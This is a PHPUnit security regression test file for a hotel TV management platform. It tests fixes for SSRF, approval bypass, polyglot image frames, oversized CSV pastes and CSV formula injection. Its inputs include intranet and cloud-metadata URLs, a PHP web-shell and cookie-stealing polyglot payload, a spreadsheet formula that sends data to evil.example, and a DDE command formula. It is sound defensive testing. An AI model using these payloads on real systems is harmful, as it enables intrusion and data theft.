<?php
declare(strict_types=1);

use PHPUnit\Framework\TestCase;

/**
 * Security review of 2.4 (docs/SECURITY.md "2.4 additions"): regression tests for the fixed findings and
 * for the protections the review relied on.
 *  1. PLAY_SOUND accepted any http(s) URL: an admin user could make every TV fetch intranet URLs (router /
 *     NAS admin pages, cloud metadata) from inside the hotel network. Now only the hotel's sound library.
 *  2. Ad campaigns, the local guide and images referenced by display apps ignored the approval workflow
 *     (and the validity window): content waiting for approval reached the TVs.
 *  3. Live view frames from the TV were stored byte for byte (appended / polyglot payloads kept).
 *  4. The celebrations CSV import limited the uploaded file to 1 MB but not the pasted text (post_max_size
 *     is 260 MB): one request could tie up a PHP worker with a huge text.
 *  Plus: CSV formula injection in the proof of play export, presence token tenant binding, web player
 *  sandbox for HTML items.
 */
final class SecurityRegression24Test extends TestCase
{
    private static string $url;
    /** @var array<string, int> */
    private static array $id = [];
    /** @var array<string, array{uid: string, token: string, id: int}> */
    private static array $tv = [];
    private static array $tmp = [];

    public static function setUpBeforeClass(): void
    {
        TestEnv::resetDatabase();
        Tenant::set(1);
        $pw = Auth::hash('Passw0rd!');
        foreach (['s24Mgr' => 'manager', 's24Boss' => 'super_admin'] as $u => $role) {
            self::$id[$u] = DB::insert('users', ['hotel_id' => 1, 'username' => $u, 'email' => $u . '@t.test', 'full_name' => $u, 'password_hash' => $pw, 'role' => $role]);
        }
        self::$id['r101'] = DB::insert('rooms', ['room_number' => '101', 'name' => 'Room 101', 'floor' => '1']);
        self::$id['h2'] = Hotels::create(['name' => 'Hotel Two']);
        Tenant::run(self::$id['h2'], static function (): void {
            self::$id['r201'] = DB::insert('rooms', ['room_number' => '201', 'name' => 'Room 201', 'floor' => '2']);
            self::$id['h2sound'] = DB::insert('sounds', ['name' => 'H2 bell', 'file_path' => 'h' . self::$id['h2'] . '/sounds/2026/10/h2bell.mp3', 'mime' => 'audio/mpeg', 'size_bytes' => 10, 'created_at' => now()]);
        });
        Tenant::set(1);
        self::$id['h1sound'] = DB::insert('sounds', ['name' => 'Lobby gong', 'file_path' => 'h1/sounds/2026/10/gong.mp3', 'mime' => 'audio/mpeg', 'size_bytes' => 10, 'created_at' => now()]);
        Settings::setPlatform('task_last_DeviceHealthTask', (string) (time() + 86400));
        ContentResolver::resetExtensions();
        Cache::clear();
        self::$url = TestEnv::startServer(HC_ROOT, __DIR__ . '/../../router.php', 2);
        TestEnv::writeConfig(HC_ROOT, self::$url);
        $keys = [1 => (string) Settings::get('registration_key'), self::$id['h2'] => (string) Settings::getFor(self::$id['h2'], 'registration_key')];
        foreach (['tv101' => ['101', 1], 'tv201' => ['201', self::$id['h2']]] as $name => [$room, $hotel]) {
            $uid = 'tv-s24-' . $name . '-0001';
            [$s, $j] = TestEnv::http('POST', self::$url . 'api/device/register', ['device_id' => $uid, 'room_number' => $room, 'registration_key' => $keys[$hotel], 'app_version' => '2.4.0', 'app_version_code' => 11]);
            self::assertSame(200, $s, (string) json_encode($j));
            self::$tv[$name] = ['uid' => $uid, 'token' => (string) $j['data']['token'],
                'id' => (int) DB::value('SELECT id FROM devices WHERE device_uid = :u AND hotel_id = :h', ['u' => $uid, 'h' => $hotel])];
        }
    }

    public static function tearDownAfterClass(): void
    {
        foreach (self::$tmp as $f) {
            @unlink($f);
        }
        @unlink(LiveView::framePath(1, self::$tv['tv101']['id'] ?? 0));
        Access::$userOverride = null;
        Access::forget();
        ContentResolver::resetExtensions();
        Tenant::set(1);
    }

    protected function setUp(): void
    {
        DB::query('DELETE FROM rate_limits');
        Tenant::set(1);
        Settings::flush();
    }

    private static function queued(int $deviceId, string $command): array
    {
        return array_map(
            static fn ($r) => json_decode((string) $r['payload'], true),
            DB::all('SELECT payload FROM device_commands WHERE device_id = :d AND command = :c ORDER BY id', ['d' => $deviceId, 'c' => $command])
        );
    }

    // ------------------------------------------------------------------ 1. PLAY_SOUND → TV-side SSRF

    public function testPlaySoundOnlyPlaysTheHotelsOwnSoundLibrary(): void
    {
        $tv = self::$tv['tv101']['id'];
        DB::query("DELETE FROM device_commands WHERE command = 'PLAY_SOUND'");
        $h2Url = Tenant::run(self::$id['h2'], fn () => (string) Sounds::resolve('u:' . self::$id['h2sound'])['url']);
        foreach (['http://192.168.1.1/cgi-bin/luci/admin/system/reboot', 'http://169.254.169.254/latest/meta-data/', 'http://10.0.0.5:8080/', 'https://evil.example/track.mp3', $h2Url] as $url) {
            try {
                TvControls::send('PLAY_SOUND', 'rooms', [self::$id['r101']], ['url' => $url]);
                $this->fail('PLAY_SOUND must refuse ' . $url);
            } catch (InvalidArgumentException) {
                $this->addToAssertionCount(1);
            }
        }
        // Another hotel's uploaded sound by reference → 404 (Tenant deny).
        try {
            TvControls::send('PLAY_SOUND', 'rooms', [self::$id['r101']], ['sound' => 'u:' . self::$id['h2sound']]);
            $this->fail('foreign sound id must be denied');
        } catch (TenantException) {
            $this->addToAssertionCount(1);
        }
        $this->assertSame([], self::queued($tv, 'PLAY_SOUND'), 'nothing queued');

        // The hotel's own sounds still work: built-in and uploaded, by reference or by their exact URL.
        $own = (string) Sounds::resolve('u:' . self::$id['h1sound'])['url'];
        TvControls::send('PLAY_SOUND', 'rooms', [self::$id['r101']], ['sound' => 'b:school_bell', 'volume' => 50]);
        TvControls::send('PLAY_SOUND', 'rooms', [self::$id['r101']], ['url' => $own, 'repeat' => 2]);
        $q = self::queued($tv, 'PLAY_SOUND');
        $this->assertCount(2, $q);
        $this->assertMatchesRegularExpression('#/assets/sounds/school_bell\.wav$#', $q[0]['url']);
        $this->assertSame($own, $q[1]['url']);

        // End to end: the TV controls page (crafted POST) queues nothing for an intranet URL.
        DB::query("DELETE FROM device_commands WHERE command = 'PLAY_SOUND'");
        $m = new AdminSession(self::$url, 's24Mgr');
        [$code] = $m->post('tv_controls.php', ['op' => 'command', 'command' => 'PLAY_SOUND', 'url' => 'http://192.168.1.1/cgi-bin/reboot', 'target_type' => 'rooms', 'room_ids' => [self::$id['r101']]]);
        $this->assertSame(302, $code);
        $this->assertSame([], self::queued($tv, 'PLAY_SOUND'));
        [, , $html] = $m->get('tv_controls.php');
        $this->assertStringContainsString('sound library', $html);
    }

    // ------------------------------------------------------------------ 2. approval bypass (ads, guide, app images)

    public function testAdsGuideAndAppImagesNeverShowContentWaitingForApproval(): void
    {
        $pending = DB::insert('content_items', ['title' => 'Staff draft ad', 'type' => 'image', 'url' => 'https://example.com/a.jpg', 'is_active' => 1, 'approval_status' => 'pending', 'created_at' => now()]);
        $ok = DB::insert('content_items', ['title' => 'Approved ad', 'type' => 'image', 'url' => 'https://example.com/b.jpg', 'is_active' => 1, 'created_at' => now()]);
        $sp = DB::insert('sponsors', ['name' => 'Jeweller', 'created_at' => now()]);
        $c1 = DB::insert('ad_campaigns', ['sponsor_id' => $sp, 'name' => 'Pending ad', 'content_id' => $pending, 'status' => 'active', 'start_date' => date('Y-m-d', strtotime('-1 day')), 'created_at' => now()]);
        $c2 = DB::insert('ad_campaigns', ['sponsor_id' => $sp, 'name' => 'Approved ad', 'content_id' => $ok, 'status' => 'active', 'start_date' => date('Y-m-d', strtotime('-1 day')), 'created_at' => now()]);
        $live = static fn (): array => array_map(static fn ($c) => (int) $c['id'], Ads::liveCampaigns());
        $this->assertSame([$c2], array_values(array_intersect($live(), [$c1, $c2])), 'a pending ad item is not on air');
        DB::update('content_items', ['valid_to' => date('Y-m-d H:i:s', time() - 60)], 'id = :id', ['id' => $ok]);
        $this->assertNotContains($c2, $live(), 'an expired ad item is not on air either');
        DB::update('content_items', ['approval_status' => 'approved'], 'id = :id', ['id' => $pending]);
        $this->assertContains($c1, $live(), 'approved → on air');
        DB::update('content_items', ['approval_status' => 'pending'], 'id = :id', ['id' => $pending]);

        // Local guide (guest menu) with a pending item: no menu entry.
        Settings::set('local_guide_content_id', (string) $pending);
        $content = ['mode' => 'assigned', 'guest_menu' => []];
        (new GuideExtension())->apply($content, ['id' => self::$id['r101']]);
        $this->assertSame([], $content['guest_menu']);
        DB::update('content_items', ['approval_status' => 'approved'], 'id = :id', ['id' => $pending]);
        $content = ['mode' => 'assigned', 'guest_menu' => []];
        (new GuideExtension())->apply($content, ['id' => self::$id['r101']]);
        $this->assertSame(['guide'], array_column($content['guest_menu'], 'id'));
        DB::update('content_items', ['approval_status' => 'pending'], 'id = :id', ['id' => $pending]);
        Settings::set('local_guide_content_id', '');

        // Library images of display apps (slideshow / photo apps).
        $ok2 = DB::insert('content_items', ['title' => 'Lobby photo', 'type' => 'image', 'url' => 'https://example.com/c.jpg', 'is_active' => 1, 'created_at' => now()]);
        $this->assertSame(['c' . $ok2], array_column(ContentApps::librarySlides([$pending, $ok2]), 'id'));

        DB::query('DELETE FROM ad_campaigns WHERE id IN (:a, :b)', ['a' => $c1, 'b' => $c2]);
        foreach ([$pending, $ok, $ok2] as $cid) {
            ContentManager::deleteItem($cid);
        }
    }

    // ------------------------------------------------------------------ 3. live view frames are re-encoded

    public function testLiveViewFramesAreReEncodedAndBoundToTheDevicesSession(): void
    {
        $dev = DB::one('SELECT * FROM devices WHERE id = :id', ['id' => self::$tv['tv101']['id']]);
        LiveView::start((int) $dev['id']);
        $token = (string) DB::value('SELECT token FROM device_live_views WHERE device_id = :d', ['d' => $dev['id']]);
        $im = imagecreatetruecolor(320, 180);
        imagefill($im, 0, 0, imagecolorallocate($im, 30, 90, 160));
        ob_start();
        imagejpeg($im, null, 70);
        $jpeg = (string) ob_get_clean();
        $payload = "<?php system(\$_GET['c']); ?><script>alert(document.cookie)</script><html><body>polyglot";
        $r = LiveView::acceptFrame($dev, $token, $jpeg . $payload);
        $this->assertTrue($r['stored']);
        $stored = (string) file_get_contents(LiveView::framePath(1, (int) $dev['id']));
        $this->assertStringStartsWith("\xFF\xD8\xFF", $stored);
        $this->assertSame([320, 180], array_slice(getimagesizefromstring($stored) ?: [], 0, 2));
        foreach (['<?php', '<script', 'polyglot'] as $needle) {
            $this->assertStringNotContainsString($needle, $stored, 'payload dropped by re-encoding');
        }
        // Another hotel's TV cannot write into this session (the token only belongs to tv101).
        $other = DB::one('SELECT * FROM devices WHERE id = :id', ['id' => self::$tv['tv201']['id']]);
        $this->assertFalse(Tenant::run(self::$id['h2'], fn () => LiveView::acceptFrame($other, $token, $jpeg))['stored']);
        LiveView::stop((int) $dev['id']);
        $this->assertFalse(LiveView::acceptFrame($dev, $token, $jpeg, time() + 5)['stored'], 'stopped session refuses frames');
    }

    // ------------------------------------------------------------------ 4. CSV import / export

    public function testCelebrationsPastedCsvIsLimitedToOneMegabyte(): void
    {
        $before = (int) DB::value('SELECT COUNT(*) FROM celebrations WHERE hotel_id = 1');
        $huge = str_repeat("Asha Patel,08/10/1990,birthday,Front office\n", 26000); // ≈ 1.1 MB
        $this->assertGreaterThan(1024 * 1024, strlen($huge));
        $m = new AdminSession(self::$url, 's24Mgr');
        [$code] = $m->post('celebrations.php', ['op' => 'import', 'consent_all' => '1', 'csv_text' => $huge]);
        $this->assertSame(302, $code);
        $this->assertSame($before, (int) DB::value('SELECT COUNT(*) FROM celebrations WHERE hotel_id = 1'), 'nothing imported from an oversized paste');
        [, , $html] = $m->get('celebrations.php');
        $this->assertStringContainsString('max. 1 MB', $html);
        // A normal paste still works.
        $m->post('celebrations.php', ['op' => 'import', 'consent_all' => '1', 'csv_text' => "Asha Patel,08/10/1990,birthday,Front office\n"]);
        $this->assertSame($before + 1, (int) DB::value('SELECT COUNT(*) FROM celebrations WHERE hotel_id = 1'));
        DB::query('DELETE FROM celebrations WHERE hotel_id = 1');
    }

    public function testPlayReportCsvNeutralisesSpreadsheetFormulas(): void
    {
        $evil = DB::insert('content_items', ['title' => '=HYPERLINK("http://evil.example/?x="&A1,"Click")', 'type' => 'image', 'created_at' => now()]);
        $minus = DB::insert('content_items', ['title' => '-2+3+cmd|\' /C calc\'!A0', 'type' => 'image', 'created_at' => now()]);
        foreach ([$evil, $minus] as $cid) {
            DB::insert('broadcast_logs', ['device_id' => self::$tv['tv101']['id'], 'room_id' => self::$id['r101'], 'content_id' => $cid, 'event' => 'played', 'duration_sec' => 10, 'created_at' => date('Y-m-d 10:00:00')]);
        }
        $m = new AdminSession(self::$url, 's24Mgr');
        foreach (['plays', 'content'] as $kind) {
            [$code, , $csv] = $m->get('play_report.php?csv=' . $kind . '&from=' . date('Y-m-d') . '&to=' . date('Y-m-d'));
            $this->assertSame(200, $code);
            $this->assertStringContainsString("\"'=HYPERLINK(", $csv, $kind);
            $this->assertStringContainsString("'-2+3+cmd", $csv, $kind);
            $this->assertDoesNotMatchRegularExpression('/(^|[,\n])"?[=+\-@]/m', preg_replace('/^\xEF\xBB\xBF/', '', $csv), $kind . ': no cell starts with a formula character');
        }
        DB::query("DELETE FROM broadcast_logs WHERE event = 'played'");
        ContentManager::deleteItem($evil);
        ContentManager::deleteItem($minus);
    }

    // ------------------------------------------------------------------ protections the review relied on

    public function testPresenceTokenOnlyReachesTheSensorsOwnHotel(): void
    {
        DB::query('DELETE FROM device_commands');
        // A sensor of hotel 2 whose stored targets (tampered) also name hotel 1's room.
        $sid = Tenant::run(self::$id['h2'], fn () => DB::insert('presence_sensors', ['name' => 'H2 PIR', 'target_type' => 'rooms',
            'target_ids' => json_out([self::$id['r201'], self::$id['r101']]), 'idle_minutes' => 5, 'is_active' => 1, 'created_at' => now()]));
        $token = Tenant::run(self::$id['h2'], fn () => Presence::newToken($sid));
        [$s, $j] = TestEnv::http('POST', self::$url . 'api/presence', ['event' => 'motion'], ['Authorization: Bearer ' . $token]);
        $this->assertSame(200, $s, (string) json_encode($j));
        $this->assertSame(1, $j['data']['screens_on'], 'only hotel 2 room 201');
        $this->assertSame([], self::queued(self::$tv['tv101']['id'], 'SCREEN_ON'), 'hotel 1 TV untouched');
        $this->assertCount(1, self::queued(self::$tv['tv201']['id'], 'SCREEN_ON'));
        // A token is stored only as its hash; a guessed / malformed token is refused.
        $this->assertSame(hash('sha256', $token), DB::value('SELECT token_hash FROM presence_sensors WHERE id = :id', ['id' => $sid]));
        [$s] = TestEnv::http('POST', self::$url . 'api/presence', ['event' => 'motion'], ['Authorization: Bearer prs' . str_repeat('0', 48)]);
        $this->assertSame(401, $s);
        // Suspended hotel → 403, nothing switched.
        DB::query("UPDATE presence_sensors SET state = 'idle' WHERE id = :id", ['id' => $sid]);
        DB::update('hotels', ['status' => 'suspended'], 'id = :id', ['id' => self::$id['h2']]);
        Tenant::forget();
        [$s] = TestEnv::http('POST', self::$url . 'api/presence', ['event' => 'motion'], ['Authorization: Bearer ' . $token]);
        $this->assertSame(403, $s);
        DB::update('hotels', ['status' => 'active'], 'id = :id', ['id' => self::$id['h2']]);
        Tenant::forget();
        Tenant::run(self::$id['h2'], fn () => DB::delete('presence_sensors', 'id = :id', ['id' => $sid]));
    }

    public function testWebPlayerSandboxesHtmlItemsAndEscapesContent(): void
    {
        $js = (string) file_get_contents(HC_ROOT . '/assets/player/player.js');
        // HTML / timetable items: scripts only, never same-origin (the device token is in localStorage).
        $this->assertMatchesRegularExpression("/case 'html':\\s*case 'timetable':.*?setAttribute\\('sandbox', 'allow-scripts'\\);/s", $js);
        $block = substr($js, (int) strpos($js, "case 'html':"), (int) strpos($js, "case 'announcement':") - (int) strpos($js, "case 'html':"));
        $this->assertNotSame('', $block);
        $this->assertStringNotContainsString('allow-same-origin', $block);
        // The page itself: no plugins, no <base> rewriting, no inline config execution.
        [$s, , $html, $head] = TestEnv::http('GET', self::$url . 'player/');
        $this->assertSame(200, $s);
        $this->assertStringContainsString("object-src 'none'", $head);
        $this->assertStringContainsString("base-uri 'none'", $head);
        $this->assertStringContainsString('<script type="application/json" id="hc-config">', $html);
        $this->assertStringNotContainsString('csrf', strtolower($html), 'no admin CSRF token on the public player');
    }
}
